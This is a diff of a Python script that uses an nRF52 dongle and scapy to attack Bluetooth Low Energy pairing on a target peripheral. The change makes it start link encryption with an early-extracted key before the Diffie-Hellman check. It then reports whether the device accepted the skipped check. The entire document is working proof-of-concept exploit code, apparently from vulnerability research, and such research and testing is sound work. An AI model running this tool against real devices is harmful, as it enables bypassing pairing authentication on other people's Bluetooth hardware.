@@ -1,10 +1,10 @@
 #!/usr/bin/python
 import os
 import platform
+import sys
 from binascii import hexlify
 from time import sleep
 import importlib
-import sys
 
 # extra libs
 sys.path.insert(0, os.getcwd() + '/')  # If the user runs this on previous path
@@ -16,7 +16,6 @@ from colorama import Fore
 from drivers.NRF52_dongle import NRF52Dongle
 from scapy.layers.bluetooth4LE import *
 from scapy.layers.bluetooth import *
-from scapy.packet import Raw
 from scapy.utils import raw
 from timeout_lib import start_timeout, disable_timeout, update_timeout
 from Crypto.Cipher import AES
@@ -31,18 +30,19 @@ import BLESMPServer
 master_address = '5d:36:ac:90:0b:20'
 access_address = 0x9a328370
 # Normal pairing request for secure pairing (uncomment the following to choose pairing request method)
-# pairing_iocap = 0x01  # DisplayYesNo
-pairing_iocap = 0x03  # NoInputNoOutput
+pairing_iocap = 0x01  # DisplayYesNo
+# pairing_iocap = 0x03  # NoInputNoOutput
 # pairing_iocap = 0x04  # KeyboardDisplay
 # paring_auth_request = 0x00  # No bounding
 # paring_auth_request = 0x01  # Bounding
-# paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
+paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
 # paring_auth_request = 0x04 | 0x01  # MITM + bounding
-paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bounding
+# paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bounding
 print(Fore.YELLOW + 'Using IOCap: ' + hex(pairing_iocap) + ', Auth REQ: ' + hex(paring_auth_request))
+
 # Internal vars
-SCAN_TIMEOUT = 2
-CRASH_TIMEOUT = 6
+SCAN_TIMEOUT = 2.2
+CRASH_TIMEOUT = 6.0
 none_count = 0
 end_connection = False
 connecting = False
@@ -54,20 +54,11 @@ conn_rx_packet_counter = 0
 encryption_enabled = False
 pairing_procedure = False
 crashed = False
-version_received = False
-fragment = False
 fragment_start = False
-fragment_left = False
-switch_ediv_rand = 0
+fragment_left = 0
+fragment = None
 slave_txaddr = 0  # use public address by default
-slave_ever_connected = False
-ediv = '\x00'
-rand = '\x00'
 
-addr_type = {
-    0: 'Public',
-    1: 'Random'
-}
 # Autoreset colors
 colorama.init(autoreset=True)
 
@@ -86,44 +77,34 @@ print(Fore.YELLOW + 'Serial port: ' + serial_port)
 
 # Get advertiser_address from command line (peripheral addr)
 if len(sys.argv) >= 3:
-    advertiser_address = sys.argv[2].upper()
+    advertiser_address = sys.argv[2].lower()
 else:
-    advertiser_address = 'A4:C1:38:D8:AD:B8'
+    # advertiser_address = 'A4:C1:38:D8:AD:B8'
+    advertiser_address = 'f8:f0:05:f3:66:e0'.lower()
 
 print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 
 
 def crash_timeout():
-    if slave_ever_connected:
+    global crashed
+    if not crashed:
+        crashed = True
         print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
               ' received\nThe device may have crashed!!!')
-        disable_timeout('scan_timeout')
-
-
-def switch_ediv_rand_test():
-    global switch_ediv_rand, ediv, rand
-    if switch_ediv_rand == 0:
-        ediv = '\xff'
-        rand = '\x00'
-        switch_ediv_rand = 1
-    elif switch_ediv_rand == 1:
-        ediv = '\x00'
-        rand = '\xff'
-        switch_ediv_rand = 2
-    elif switch_ediv_rand == 2:
-        ediv = '\xff'
-        rand = '\xff'
-        switch_ediv_rand = 0
+    disable_timeout('scan_timeout')
 
 
 def scan_timeout():
+    global encryption_enabled
     global connecting
     connecting = False
+    encryption_enabled = False
     scan_req = BTLE() / BTLE_ADV(RxAdd=slave_txaddr) / BTLE_SCAN_REQ(
         ScanA=master_address,
         AdvA=advertiser_address)
     driver.send(scan_req)
     start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)
+    start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)
 
 
 def set_security_settings(pkt):
@@ -137,43 +118,6 @@ def set_security_settings(pkt):
 def bt_crypto_e(key, plaintext):
     aes = AES.new(key, AES.MODE_ECB)
     return aes.encrypt(str(plaintext))
-
-
-def send_pairing_request():
-    global pairing_procedure, access_address, pairing_iocap, paring_auth_request, master_address, advertiser_address
-    master_address_raw = ''.join(map(lambda x: chr(int(x, 16)), master_address.split(':')))
-    slave_address_raw = ''.join(map(lambda x: chr(int(x, 16)), advertiser_address.split(':')))
-    BLESMPServer.set_pin_code('\x00' * 4)
-    BLESMPServer.configure_connection(master_address_raw, slave_address_raw, 0,
-                                      pairing_iocap, paring_auth_request)
-    hci_res = BLESMPServer.pairing_request()
-    if hci_res:
-        pairing_procedure = True
-        # Pairing request
-        pkt = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
-        driver.send(pkt)
-
-
-def defragment_l2cap(pkt):
-    global fragment, fragment_start, fragment_left
-    # Handle L2CAP fragment
-    if L2CAP_Hdr in pkt and pkt[L2CAP_Hdr].len + 4 > pkt[BTLE_DATA].len:
-        fragment_start = True
-        fragment_left = pkt[L2CAP_Hdr].len
-        fragment = raw(pkt)[:-3]
-        return None
-    elif fragment_start and BTLE_DATA in pkt and pkt[BTLE_DATA].LLID == 0x01:
-        fragment_left -= pkt[BTLE_DATA].len + 4
-        fragment += raw(pkt[BTLE_DATA].payload)
-        if pkt[BTLE_DATA].len >= fragment_left:
-            fragment_start = False
-            pkt = BTLE(fragment + '\x00\x00\x00')
-            pkt.len = len(pkt[BTLE_DATA].payload)  # update ble header length
-            return pkt
-        else:
-            return None
-    else:
-        return pkt
 
 
 def send_encrypted(pkt):
@@ -227,25 +171,47 @@ def receive_encrypted(pkt):
         return BTLE(aa + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
     except Exception as e:
         print(Fore.RED + "MIC Wrong: " + str(e))
-        return BTLE(aa + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
+        return None
+        # return BTLE(aa + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
+
+
+def defragment_l2cap(pkt):
+    global fragment, fragment_start, fragment_left
+    # Handle L2CAP fragment
+    if L2CAP_Hdr in pkt and pkt[L2CAP_Hdr].len + 4 > pkt[BTLE_DATA].len:
+        fragment_start = True
+        fragment_left = pkt[L2CAP_Hdr].len
+        fragment = raw(pkt)[:-3]
+        return None
+    elif fragment_start and BTLE_DATA in pkt and pkt[BTLE_DATA].LLID == 0x01:
+        fragment_left -= pkt[BTLE_DATA].len + 4
+        fragment += raw(pkt[BTLE_DATA].payload)
+        if pkt[BTLE_DATA].len >= fragment_left:
+            fragment_start = False
+            pkt = BTLE(fragment + '\x00\x00\x00')
+            pkt.len = len(pkt[BTLE_DATA].payload)  # update ble header length
+            return pkt
+        else:
+            return None
+    else:
+        return pkt
 
 
 # Open serial port of NRF52 Dongle
 try:
     driver = NRF52Dongle(serial_port, '115200', logs_pcap=True,
-                         pcap_filename='logs/deadlock_hci_mic.pcap')
+                         pcap_filename='logs/dhcheck_skip_capture.pcap')
 except Exception as e:
     print(Fore.RED + str(e))
     print(Fore.RED + 'Make sure the nRF52 dongle is properly recognized by your computer')
     exit(0)
 # Send scan request
-scan_req = BTLE() / BTLE_ADV(RxAdd=0) / BTLE_SCAN_REQ(
+scan_req = BTLE() / BTLE_ADV(RxAdd=slave_txaddr) / BTLE_SCAN_REQ(
     ScanA=master_address,
     AdvA=advertiser_address)
 driver.send(scan_req)
 
 start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)
-start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)
 
 print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
 while True:
@@ -255,8 +221,7 @@ while True:
     if data:
         # Decode Bluetooth Low Energy Data
         if encryption_enabled:
-            pkt = BTLE(data)
-            pkt = receive_encrypted(pkt)  # Decrypt Link Layer
+            pkt = receive_encrypted(BTLE(data))  # Decrypt Link Layer
         else:
             pkt = BTLE(data)  # Receive plain text Link Layer
 
@@ -265,33 +230,26 @@ while True:
         # if packet is incorrectly decoded, you may not be using the dongle
         if pkt is None:
             none_count += 1
-            if none_count >= 16:
+            if none_count >= 6:
                 print(Fore.RED + 'NRF52 Dongle not detected')
                 sys.exit(0)
             continue
         elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
-            update_timeout('scan_timeout')
             # Print slave data channel PDUs summary
             print(Fore.MAGENTA + "RX <--- " + pkt.summary()[7:])
-
-        if BTLE_DATA in pkt:
-            none_count = 0
-            update_timeout('crash_timeout')
         # --------------- Process Link Layer Packets here ------------------------------------
         # Check if packet from advertised is received
-        if (
-                BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
+        if (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower() \
+                and connecting == False:
             connecting = True
-            end_connection = False
             update_timeout('scan_timeout')
-            update_timeout('crash_timeout')
-            start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)
+            disable_timeout('crash_timeout')
             conn_rx_packet_counter = 0
             conn_tx_packet_counter = 0
-            encryption_enabled = False
+            fragment = ''
             slave_txaddr = pkt.TxAdd
+            encryption_enabled = False
             print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
-            print(Fore.GREEN + 'Slave address type: ' + addr_type[slave_txaddr])
             # Send connection request to advertiser
             conn_request = BTLE() / BTLE_ADV(RxAdd=slave_txaddr, TxAdd=0) / BTLE_CONNECT_REQ(
                 InitA=master_address,
@@ -311,20 +269,19 @@ while True:
             # them!!!
             driver.send(conn_request)
 
+        if LL_LENGTH_REQ in pkt:
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
+                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
+            driver.send(pkt)
+
         if BTLE_DATA in pkt and connecting == True:
             connecting = False
-            update_timeout('crash_timeout')
-            slave_ever_connected = True
-            if LL_VERSION_IND in pkt:
-                version_received = True
-                # Send version indication response
-                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
-                driver.send(pkt)
-
+            disable_timeout('crash_timeout')
+            slave_l2cap_fragment = []
+            pkts_to_process = []
+            version_request_number = 0
+            att_mtu_request_count = 0
             print(Fore.GREEN + 'Slave Connected (Link Layer data channel established)')
-            if SM_Security_Request in pkt:
-                set_security_settings(pkt)
-
             if SM_Security_Request in pkt:
                 set_security_settings(pkt)
             # Send Feature request
@@ -341,53 +298,53 @@ while True:
             driver.send(pkt)
 
         elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
-            pkt = BTLE(access_addr=access_address) / \
-                  BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(mtu=247)
-            driver.send(pkt)
-
-        elif LL_LENGTH_REQ in pkt:
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
-                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
-            driver.send(pkt)
+            if att_mtu_request_count < 1:
+                pkt = BTLE(access_addr=access_address) / \
+                      BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(mtu=247)
+                driver.send(pkt)
+            att_mtu_request_count += 1
 
         elif ATT_Exchange_MTU_Response in pkt:
             # Send version indication request
-            if version_received == False:
-                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
-                driver.send(pkt)
-            else:
-                send_pairing_request()
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
+            driver.send(pkt)
 
         elif LL_VERSION_IND in pkt:
-            send_pairing_request()
+            if version_request_number < 1:
+                master_address_raw = ''.join(map(lambda x: chr(int(x, 16)), master_address.split(':')))
+                slave_address_raw = ''.join(map(lambda x: chr(int(x, 16)), advertiser_address.split(':')))
+                BLESMPServer.configure_connection(master_address_raw, slave_address_raw, 0,
+                                                  pairing_iocap, paring_auth_request)
+                hci_res = BLESMPServer.pairing_request()
+                if hci_res:
+                    pairing_procedure = True
+                    # Pairing request
+                    pkt = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
+                    driver.send(pkt)
+            version_request_number += 1
 
         elif pairing_procedure and SM_Hdr in pkt:
             # Handle pairing response and so on
             smp_answer = BLESMPServer.send_hci(raw(HCI_Hdr() / HCI_ACL_Hdr() / L2CAP_Hdr() / pkt[SM_Hdr]))
-            if smp_answer is not None and isinstance(smp_answer, list):
+            # Start encryption setup early (before DHCheck)
+            if SM_Random in pkt:
+                conn_ltk = BLESMPServer.get_ltk()  # Extract ltk, which is calculated after SM_Random
+                print(Fore.GREEN + "[!] Early LTK received from SMP server: " + hexlify(conn_ltk).upper())
+                conn_iv = '\x00' * 4  # set IVm (IV of master)
+                conn_skd = '\x00' * 8  # set SKDm (session key diversifier part of master)
+                enc_request = BTLE(
+                    access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv='\x00',
+                                                                                       rand='\x00',
+                                                                                       skdm=conn_iv,
+                                                                                       ivm=conn_skd)
+                driver.send(enc_request)
+
+            elif smp_answer is not None and isinstance(smp_answer, list):
                 for res in smp_answer:
                     res = HCI_Hdr(res)  # type: HCI_Hdr
                     if SM_Hdr in res:
-                        pkt = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / res[SM_Hdr]
-                        if encryption_enabled:
-                            send_encrypted(pkt)
-                        else:
-                            driver.send(pkt)
-
-                    elif HCI_Cmd_LE_Start_Encryption_Request in res:
-                        conn_ltk = res.ltk
-                        print(Fore.GREEN + "[!] STK/LTK received from SMP server: " + hexlify(res.ltk).upper())
-                        conn_iv = '\x00' * 4  # set IVm (IV of master)
-                        conn_skd = '\x00' * 8  # set SKDm (session key diversifier part of master)
-                        # CHange ediv and rand
-                        switch_ediv_rand_test()
-
-                        enc_request = BTLE(
-                            access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv=ediv,
-                                                                                               rand=rand,
-                                                                                               skdm=conn_iv,
-                                                                                               ivm=conn_skd)
-                        driver.send(enc_request)
+                        smp_pkt = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / res[SM_Hdr]
+                        driver.send(smp_pkt)
 
         elif LL_ENC_RSP in pkt:
             # Get IVs and SKDs from slave encryption response
@@ -400,12 +357,6 @@ while True:
             print(Fore.GREEN + 'Stored   LTK: ' + hexlify(conn_ltk))
             print(Fore.GREEN + 'AES-CCM  Key: ' + hexlify(conn_session_key))
 
-        elif LL_SLAVE_FEATURE_REQ in pkt:
-            # Send Feature request
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_RSP(
-                feature_set='le_encryption+le_data_len_ext')
-            driver.send(pkt)
-
         # Slave will send LL_ENC_RSP before the LL_START_ENC_RSP
         elif LL_START_ENC_REQ in pkt:
             encryption_enabled = True
@@ -415,23 +366,15 @@ while True:
 
         elif LL_START_ENC_RSP in pkt:
             print(Fore.GREEN + 'Link Encrypted')
-            print (Fore.RED + '[Noncompliance, ediv=' + hexlify(ediv) + ', rand=' + hexlify(rand) + ']\n' +
-                   'Peripheral accepted nonzero ediv or rand after pairing procedure\n'
-                   'Restarting test...')
+            print(Fore.RED + 'Ooops, DHCheck was just skipped!!!')
             end_connection = True
-            # driver.save_pcap()
-            # exit(0)
+            driver.save_pcap()
+            exit(0)
 
         elif LL_REJECT_IND in pkt or SM_Failed in pkt:
-            print('Peripheral is rejecting pairing')
             end_connection = True
-
-        elif L2CAP_Hdr in pkt and Raw in pkt:
-            print(Fore.GREEN + 'Peripheral seems OK')
-
-        if SM_Failed in pkt:
-            print(Fore.YELLOW + '[Error] Ensure the peripheral under test accepts the pairing request\n'
-                                'to proceed')
+            print(Fore.GREEN + 'Peripheral is safe against DHCheck Skip')
+            exit(0)
 
         if end_connection:
             end_connection = False
